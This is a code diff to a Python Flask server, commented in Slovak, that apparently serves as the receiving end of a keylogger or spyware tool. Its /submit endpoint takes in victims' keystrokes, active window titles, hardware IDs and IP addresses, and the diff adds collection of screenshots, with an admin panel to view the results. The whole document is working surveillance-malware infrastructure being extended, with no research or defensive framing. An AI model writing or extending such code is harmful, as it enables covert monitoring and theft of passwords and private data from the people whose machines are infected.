@@ -13,21 +13,23 @@ def home():
 def submit():
     json_data = request.json
     print("Received data:", json_data)  # log pre debug
-    
-    # Debug výpisy pre kľúče
+
+    # Debug výpisy
     print("Keys:", json_data.get('keys'))
     print("Active window:", json_data.get('active_window'))
-    
+    print("Screenshot: received" if json_data.get('screenshot') else "Screenshot: missing")
+
     entry = {
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'user_id': json_data.get('user_id', 'N/A'),
         'hwid': json_data.get('hwid', 'N/A'),
         'ip_address': json_data.get('ip_address', 'N/A'),
         'keys': json_data.get('keys', 'N/A'),
-        'active_window': json_data.get('active_window', 'N/A')  # opravený kľúč
+        'active_window': json_data.get('active_window', 'N/A'),
+        'screenshot': json_data.get('screenshot')  # pridané!
     }
     DATA.append(entry)
-    
+
     return {"status": "received"}
 
 @app.route('/admin', methods=['GET', 'POST'])
@@ -45,6 +47,7 @@ def logout():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
+
 
 
 
